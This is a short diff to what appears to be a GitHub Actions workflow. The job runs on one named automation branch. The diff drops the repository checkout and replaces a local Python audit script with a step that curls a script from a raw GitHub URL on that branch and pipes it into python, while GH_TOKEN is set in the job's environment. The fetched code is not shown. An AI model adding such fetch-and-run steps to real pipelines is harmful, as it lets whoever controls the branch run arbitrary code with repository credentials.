@@ -13,9 +13,10 @@ jobs:
     if: github.head_ref == 'automation/branch-audit-cleanup-20260728'
     runs-on: ubuntu-latest
     steps:
-      - uses: actions/checkout@v4
       - name: Report remaining branches
         env:
           GH_TOKEN: ${{ github.token }}
           REPOSITORY: ${{ github.repository }}
-        run: python .github/scripts/temporary_branch_audit.py
+          SCRIPT_URL: https://raw.githubusercontent.com/gecompat/SQL_Server_Lab/automation/branch-audit-cleanup-20260728/.github/scripts/temporary_branch_audit.py
+        shell: bash
+        run: curl --fail --silent --show-error "$SCRIPT_URL" | python -
